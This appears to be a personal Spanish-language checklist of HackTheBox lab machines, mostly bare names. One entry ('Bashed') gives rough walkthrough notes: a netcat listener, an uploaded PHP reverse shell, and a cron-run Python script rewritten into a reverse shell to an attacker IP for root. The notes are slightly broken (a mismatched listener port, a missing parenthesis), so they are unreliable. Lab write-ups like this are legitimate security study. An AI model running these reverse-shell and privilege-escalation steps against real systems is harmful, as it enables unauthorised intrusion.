- Lame $X$ 
- Jerry $X$ 
- Blue $X$
- Bashed $pendiente por algun chupaverga. PASOS PARA COMPLETARLA OTRO DIA:$
```bash
#entrar a la ip:80/dev
#en tu terminal kali
nc -lvnp 1234 (el puerto q quieras)
#en la terminal /uploads
wget php-reverse-shell.php #ponele tu ip y puerto = nc
#si sale todo bien carga la web en la url /uploads/reverse.php
#ahi ya entraste, despues
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -u scriptmanager bash
cd scripts
#aca viene el quilombito
#archivo .py y .test, el .py modifica al .test, lo que se hace es modificar el .py para que nos abra otra shell pero como root :) 
#la teoria:
vi test.py
#en el archivo escribir
python -c 'import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.46",5432)
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'
#en kali
nc -lvnp 9999
#target
date
#y listorti :D
```
write up: https://www.youtube.com/watch?v=2DqdPcbYcy8 
- Beep
- Shocker
- Nibbles
- Optimum
- Granny
- Devel
- Legacy
- Grandpa
- Bastion
- Netmon
- Irked
- Popcorn
- OpenAdmin
- Bank
- Postman
- Valentine
- Forest
- Fuse
- Magic
- Arctic
- Blunder
- Ypuffy
- Curling
- Bounty
- Chaos
- Monteverde
- SolidState
- Buff
- Knife
- Oopsie
- Poison
- Blackfield
- TartarSauce
- Blocky
- SneakyMailer
- Nineveh
- Heist
- Traceback
- Sauna
- Active
- Bitlab
- Buff
- Friendzone
- Traverxec
- Mango
- Fortune